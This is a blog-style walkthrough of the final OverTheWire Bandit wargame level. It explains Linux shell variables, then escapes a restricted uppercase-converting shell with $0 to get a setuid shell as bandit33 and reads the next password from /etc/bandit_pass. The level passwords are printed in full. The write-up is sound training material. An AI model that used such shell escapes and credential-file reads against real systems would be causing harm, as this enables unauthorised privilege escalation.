---
title: "Bandit: Level 32 - END"
date: 2024-10-14 13:00:00 -500 
categories: [OvertheWire, Bandit]
tags: [linux,wargames,bandit,overthewire]
author: Christoph K
---

### Level 32

**Username:** `bandit32`  
**Password:** `3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K`

### Task:
https://overthewire.org/wargames/bandit/bandit33.html

<!-- PICTURE FROM TASK -->

    After all this git stuff, it’s time for another escape. Good luck!
<!-- change username bandit!! -->


### Start

Let's begin by connecting to the server `bandit.labs.overthewire.org` and logging in with user `bandit32` on port `2220`.



<!-- CHANGE COMMANDS IF NECCESSARY -->


### Solve the level




Before I solve the level, we have to talk about `variables` in Linux.

Linux has different types of variables:

- Local Variables: These are only used in the current shell session.
- Shell Variables: These are set up by the shell itself.
- Environment Variables: These are available system-wide.

The names of these variables are always in uppercase. You can create a variable by typing VAR_NAME=var_value in the command line. To see what a variable contains, use the command echo $VAR_NAME.

To print all environment variables, you can use `printenv`.

Some common that are good to know are:

- TERM -  current terminal emulation
- HOME - the path to home directory of currently logged in user
- LANG - current locales settings
- PATH - directory list to be searched when executing commands
- PWD - pathname of the current working directory
- SHELL/0 - the path of the current user’s shell
- USER - currently logged-in user



For example `$0` is normally `bash`. You can check that with `echo $0`.



We solve the level with that variable:

``` bash

sh: 1: SH: Permission denied
>> $0
$ ls
uppershell
$ ls -la
total 36
drwxr-xr-x  2 root     root      4096 Sep 19 07:08 .
drwxr-xr-x 70 root     root      4096 Sep 19 07:09 ..
-rw-r--r--  1 root     root       220 Mar 31  2024 .bash_logout
-rw-r--r--  1 root     root      3771 Mar 31  2024 .bashrc
-rw-r--r--  1 root     root       807 Mar 31  2024 .profile
-rwsr-x---  1 bandit33 bandit32 15136 Sep 19 07:08 uppershell
$ whoami
bandit33
$ bash -i
bandit33@bandit:~$ cat /etc/bandit_pass/bandit33
tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0

```

Password: `tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0`


This is the last level from Bandit though, you can use the password and get following message:

```bash

bandit33@bandit:~$ ls
README.txt
bandit33@bandit:~$ cat README.txt
Congratulations on solving the last level of this game!

At this moment, there are no more levels to play in this game. However, we are constantly working
on new levels and will most likely expand this game with more levels soon.
Keep an eye out for an announcement on our usual communication channels!
In the meantime, you could play some of our other wargames.

If you have an idea for an awesome new level, please let us know!
bandit33@bandit:~$

```


